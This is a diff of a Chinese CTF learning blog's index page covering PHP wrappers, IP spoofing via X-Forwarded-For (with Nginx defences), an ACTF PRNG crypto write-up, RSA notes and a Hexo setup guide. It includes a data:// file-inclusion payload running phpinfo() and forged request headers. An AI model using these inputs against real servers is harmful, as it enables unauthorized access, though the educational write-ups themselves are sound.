-<p>​          2.data://text/plain;base64，</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php？file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/82461043">https://blog.csdn.net/nzjdsds/article/details/82461043</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/26/IP%E4%BC%AA%E9%80%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/26/IP%E4%BC%AA%E9%80%A0/" itemprop="url">IP伪造</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-26T09:22:22+08:00">
-                2021-02-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Client-Ip: 127.0.0.1<br>X-Forwarded-For: 127.0.0.1<br>Host: 127.0.0.1<br>Referer: <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
-<p>​        <strong>X-Forwarded-For</strong> 是一个事实标准，虽然没有写入 HTTP RFC 规范里，从普及程度上看其实可以算 HTTP 规范了。</p>
-<p>​        这个标准是这样定义的，每次代理服务器转发请求到下一个服务器时，要把代理服务器的 IP 写入 X-Forwarded-For 中，这样在最末端的应用服务收到请求时，就会得到一个 IP 列表：<br>X-Forwarded-For: client, proxy1, proxy2<br>因为 IP 是一个一个依次 push 进去的，那么第一个 IP 就是用户的真实 IP，取来用就好了。<br>但是，事实有这么简单吗？</p>
-<p>   攻击<br>        从安全的角度上考虑，整个系统最不安全的就是人，用户端都是最好攻破最好伪造的。有些用户就开始钻协议的漏洞：X-Forwarded-For 是代理服务器添加的，如果我一开始请求的 Header 头里就加了 X-Forwarded-For ，不就骗过服务器了吗？</p>
-<ol>
-<li><p>首先从客户端发出请求，带有 X-Forwarded-For 请求头，里面写一个伪造的 IP：<br> X-Forwarded-For: fakeIP</p>
-</li>
-<li><p>服务端第一层代理服务收到请求，发现已经有 X-Forwarded-For，误把这个请求当成代理服务器，于是向这个字段追加了客户端的真实 IP：   <strong>X-Forwarded-For: fakeIP, client</strong></p>
-</li>
-<li><p>经过几层代理后，最终的服务器拿到的 Header 是这样的：<br> <strong>X-Forwarded-For: fakeIP, client, proxy1, proxy2</strong><br> 要是按照取 X-Forwarded-For 第一个 IP 的思路，你就着了攻击者的道了，你拿到的是 fakeIP，而不是 client IP。<br> 破招<br> 服务端如何破招？上面三个步骤：<br> 第一步是客户端造假，服务器无法介入<br> 第二步是代理服务器，可控，可防范<br> 第三步是应用服务器，可控，可防范<br> 第二步的破解我拿 Nginx 服务器举例。<br> 我们在最外层的 Nginx 上，对 X-Forwarded-For 的配置如下：<br> <strong>proxy_set_header X-Forwarded-For $remote_addr;</strong><br> 什么意思呢？就是最外层代理服务器不信任客户端的 X-Forwarded-For 输入，直接覆盖，而不是追加。<br> 非最外层的 Nginx 服务器，我们配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure>
-<p>$proxy_add_x_forwarded_for 就是追加 IP 的意思。通过这招，就可以破解用户端的伪造办法。<br>第三步的破解思路也很容易，正常思路我们是取X-Forwarded-For 最左侧的 IP，这次我们反其道而行之，从右边数，减去代理服务器的数目，那么剩下的 IP 里，最右边的就是真实 IP。</p>
-</li>
-</ol>
-<p>  <strong>X-Forwarded-For: fakeIP, client, proxy1, proxy2</strong><br>  比如说我们已知代理服务有两层，从右向左数，把 proxy1 和 proxy2 去掉，剩下的 IP 列表最右边的就是真实 IP。<br>  相关思路和代码实现可参考 Egg.js 前置代理模式。<br>  通过 X-Forwarded-For 获取用户真实 IP 时，最好不要取第一个 IP，以防止用户伪造 IP。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/19/ACTF-Junior-2021-write-up/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/19/ACTF-Junior-2021-write-up/" itemprop="url">ACTF_Junior_2021_write_up</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-19T22:47:06+08:00">
-                2021-02-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><p> Do_you_know_PRNG                     </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> A,B,seed,flag</span><br><span class="line"></span><br><span class="line">S=[seed]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>(<span class="params">mod</span>):</span></span><br><span class="line">    S.append((S[-<span class="number">1</span>]*A+B)%mod)</span><br><span class="line">    <span class="keyword">return</span> S[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">Str:<span class="built_in">str</span></span>):</span></span><br><span class="line">    Len = <span class="built_in">len</span>(Str)</span><br><span class="line">    res = <span class="number">43</span> - Len</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span>*res+Str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypto</span>(<span class="params">x:<span class="built_in">str</span>,s:<span class="built_in">str</span></span>):</span></span><br><span class="line">    x=<span class="built_in">int</span>(x)</span><br><span class="line">    s=<span class="built_in">int</span>(s)</span><br><span class="line">    c=(x+s)%<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line">m = flag</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line">m=<span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:]</span><br><span class="line">c = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    s=rand(<span class="number">233333333333</span>)</span><br><span class="line">    s=<span class="built_in">str</span>(<span class="built_in">bin</span>(s))[<span class="number">2</span>:]</span><br><span class="line">    s=fill(s)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">        newc=encrypto(m[i*<span class="number">43</span>+j],s[j])</span><br><span class="line">        c=c+newc</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">cipher = <span class="number">11000010110001110100101111101001101011011110111001100101000011010110011011100101001011101100110011101001010100111010001111000110111010000111110000001111110010010010110000000100101101111011101111111000010010010100000</span></span><br><span class="line">mod = <span class="number">233333333333</span></span><br><span class="line">plain(前<span class="number">129</span>位) = <span class="number">110000101100011011101000110011001111011011101110110010100110001011000110110111101101101011001010101111101101100011010010111010001</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>已知密文和一部分的明文 ，fill()函数是进行补齐，encrypto()函数进行加密，分析可以发现，我们主要是需要知道seed,A,B的值，</p>
-<p>明文给出了三段数据</p>
-<p>由此我们可以反推出此时的s值</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="string">&#x27;1100001011000110111010001100110011110110111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;0111011001010011000101100011011011110110110&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1011001010101111101101100011010010111010001&#x27;</span>,]<span class="comment">#明文</span></span><br><span class="line">c=[<span class="string">&#x27;1100001011000111010010111110100110101101111&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;0111001100101000011010110011011100101001011&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1011001100111010010101001110100011110001101&#x27;</span>,]<span class="comment">#对应的密文</span></span><br><span class="line">b=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    x=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">        <span class="keyword">if</span> a[i][j] == c[i][j]:</span><br><span class="line">            x+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    b.append(x)  </span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m1 = <span class="string">b&#x27;0000000000000001101000110010010101011011000&#x27;</span></span><br><span class="line">m2 = <span class="string">b&#x27;0000010101111011011111010000000111011111101&#x27;</span></span><br><span class="line">m3 = <span class="string">b&#x27;0000000110010101111000101101110001001011100&#x27;</span></span><br><span class="line">d1 = <span class="built_in">int</span>(m1,<span class="number">2</span>)</span><br><span class="line">d2 = <span class="built_in">int</span>(m2,<span class="number">2</span>)</span><br><span class="line">d3 = <span class="built_in">int</span>(m3,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<p>$$<br>(S[seed]<em>A+B)\mod{mod} == d1  （1）\<br>(d1</em>A+B)\mod{mod} == d2 （2）\<br>(d2*A+B)\mod{mod} == d3（3）<br>$$</p>
-<p>从公式2和公式3入手  双重for循环   range(2**15)  结果  A=1919 B=810</p>
-<p>算出d4(s1),d5(s2)   接下来算出最后两段明文</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">Str:<span class="built_in">str</span></span>):</span></span><br><span class="line">    Len = <span class="built_in">len</span>(Str)</span><br><span class="line">    res = <span class="number">43</span> - Len</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span>*res+Str</span><br><span class="line"></span><br><span class="line">s1 = <span class="number">8260124174</span></span><br><span class="line">s1=<span class="built_in">str</span>(<span class="built_in">bin</span>(s1))[<span class="number">2</span>:]</span><br><span class="line">s1=fill(s1)</span><br><span class="line">s2 = <span class="number">217844957405</span></span><br><span class="line">s2=<span class="built_in">str</span>(<span class="built_in">bin</span>(s2))[<span class="number">2</span>:]</span><br><span class="line">s2=fill(s2)</span><br><span class="line">c1=<span class="string">&#x27;1101000011111000000111111001001001011000000&#x27;</span></span><br><span class="line">c2=<span class="string">&#x27;0100101101111011101111111000010010010100000&#x27;</span></span><br><span class="line"></span><br><span class="line">m1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">m2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">    <span class="keyword">if</span> c1[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> s1[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            m1+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m1+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m1+=s1[i]</span><br><span class="line">print(m1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">    <span class="keyword">if</span> c2[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> s2[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            m2+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m2+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m2+=s2[i]</span><br><span class="line">print(m2)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;11000010110001101110100011001100111101101110111011001010011000101100011011011110110110101100101010111110110110001101001011101000111010000110001011001010101111101100110011100100110100101100101011011100110010001111101&#x27;</span></span><br><span class="line">b = <span class="built_in">int</span>(a,<span class="number">2</span>)</span><br><span class="line">c = long_to_bytes(b)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
-<p>将所有明文合在一起，输出答案</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/19/github-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/19/github-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" itemprop="url">github 个人博客的搭建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-19T09:01:42+08:00">
-                2021-02-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <pre><code>1. 注册一个GitHub账号
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div></div></div><hr/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">榉橡的博客</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">榉橡的博客</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/03/11/nizhuangsiwei/" title="nizhuangsiwei">nizhuangsiwei</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-03-11T01:16:18.000Z" title="发表于 2021-03-11 09:16:18">2021-03-11</time></span></div><div class="content">进入界面，是一个显示的PHP代码
+12345678910111213141516171819&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#1 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/03/02/%E6%9D%82%E8%AE%B0/" title="杂记">杂记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-03-02T01:26:01.000Z" title="发表于 2021-03-02 09:26:01">2021-03-02</time></span></div><div class="content">Robots.txtrobots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它  。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。
+查看
+在url后面加上/robots.txt
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/03/02/%E5%90%88%E5%A4%A9web%E5%91%A8%E8%AE%AD/" title="合天web周训">合天web周训</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-03-02T01:24:54.000Z" title="发表于 2021-03-02 09:24:54">2021-03-02</time></span></div><div class="content">第一周  神奇的磁带     查看源代码，发现一个路径，打开后是一个乱码，保存到本地及内容是 逗你玩
+
+​        发现存在提交窗口，用Burp抓包，
+​        cookie处存在base64编码，解码
+
+在提交窗口提交解码后的编码，OK,OK
+返回一个谜语
+​    
+联系题目，答案：磁带 （type）
+OK 得到一个路径，进行访问
+
+宝塔镇河妖（bdzhy）
+OK,可以访问一个新的路径
+
+查看源代码，需要提交一个两位数字串，很明显用brup爆破即可 （66）
+
+提交66,查看源代码，得到flag
+
+第二周   就差一把钥匙查看网页的robots.txt 文件，发现存在/console路径
+
+访问路径
+
+进行IP伪造
+在提交头处写入Client-Ip:  127.0.0.1    ( XFF)
+
+第三周 | 迷了路查看源代码，未发现疑点
+
+联想到下方的不同的国旗，应该是需要改变网页的语言，可能和HTTP请求头的accept-language有关
+根据页面各国国旗位置顺序，对应得出相应的accept-language代码：
+美：en-us；
+英：en-gb；
+法：fr-F ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/03/02/RSA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="RSA学习笔记">RSA学习笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-03-02T01:23:47.000Z" title="发表于 2021-03-02 09:23:47">2021-03-02</time></span></div><div class="content">rsa学习笔记
+ 大概原理
+​    （1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。
+　　（2）甲方获取乙方的公钥，然后用它对信息加密。
+　　（3）乙方得到加密后的信息，用私钥解密。
+ 任意两个质数构成互质关系，比如13和61。
+ 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。
+ 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。
+​    \4. 和任意一个自然数是都是互质关系，比如1和99。
+\5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。
+\6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。
+\欧拉函数**
+ 任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？
+计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。
+\第一种情况**
+如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。
+\第二种情况**
+如果n是质数，则 φ(n)=n-1 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/02/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP伪协议">PHP伪协议</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-27T11:56:54.000Z" title="发表于 2021-02-27 19:56:54">2021-02-27</time></span></div><div class="content">PHP.ini在php.ini里有两个重要的参数allow_url_fopen和allow_url_includeallow_url_fopen:默认值是ON，允许url里的封装协议访问文件allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件
+php://filter经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。php://filter参数名称    描述resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔write=&lt;写链的筛选列表&gt;         该参数可选。可以设定 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/02/26/IP%E4%BC%AA%E9%80%A0/" title="IP伪造">IP伪造</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-26T01:22:22.000Z" title="发表于 2021-02-26 09:22:22">2021-02-26</time></span></div><div class="content">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: www.google.com
+​        X-Forwarded-For 是一个事实标准，虽然没有写入 HTTP RFC 规范里，从普及程度上看其实可以算 HTTP 规范了。
+​        这个标准是这样定义的，每次代理服务器转发请求到下一个服务器时，要把代理服务器的 IP 写入 X-Forwarded-For 中，这样在最末端的应用服务收到请求时，就会得到一个 IP 列表：X-Forwarded-For: client, proxy1, proxy2因为 IP 是一个一个依次 push 进去的，那么第一个 IP 就是用户的真实 IP，取来用就好了。但是，事实有这么简单吗？
+   攻击        从安全的角度上考虑，整个系统最不安全的就是人，用户端都是最好攻破最好伪造的。有些用户就开始钻协议的漏洞：X-Forwarded-For 是代理服务器添加的，如果我一开始请求的 Header 头里就加了 X-Forwarded-For ，不就骗 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/02/19/ACTF-Junior-2021-write-up/" title="ACTF_Junior_2021_write_up">ACTF_Junior_2021_write_up</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-19T14:47:06.000Z" title="发表于 2021-02-19 22:47:06">2021-02-19</time></span></div><div class="content">crypto Do_you_know_PRNG                     
+12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from flag import A,B,seed,flagS=[seed]def rand(mod):    S.append((S[-1]*A+B)%mod)    return S[-1]def fill(Str:str):    Len = len(Str)    res = 43 - Len    return &#x27;0&#x27;*res+Strdef encrypto(x:str,s:str):    x=int(x)    s=int(s)    c=(x+s)%2    return str(c)m = flagm = bytes_to_long(m)m=str(bin(m))[2:]c = &quot;&quot;for i in range(5):    s=rand(23333 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2021/02/19/github-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="github 个人博客的搭建">github 个人博客的搭建</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-19T01:01:42.000Z" title="发表于 2021-02-19 09:01:42">2021-02-19</time></span></div><div class="content">1. 注册一个GitHub账号
 2. 新建一个仓库，命名方式  用户名.github.io
 3. 进入仓库，点击settings，下滑到GitHub pages ,选择一个主题。现在就可以进入https://用户名.github.io查看博客了
-</code></pre>
-<h2 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a><strong>hexo配置</strong></h2><p>​    1.安装node.js </p>
-<p>​        下载安装包，一直next    </p>
-<p>​        检测安装成功  命令行输入node -v</p>
-<p>​        检测npm是否安装成功，在命令行中输入npm -v </p>
-<p>​    2.安装git</p>
-<p>​        git配置</p>
-<p>​        检测安装成功    命令行输入git</p>
-<p>​         安装好后，鼠标右键打开git bash  设置user.name和user.email配置信息</p>
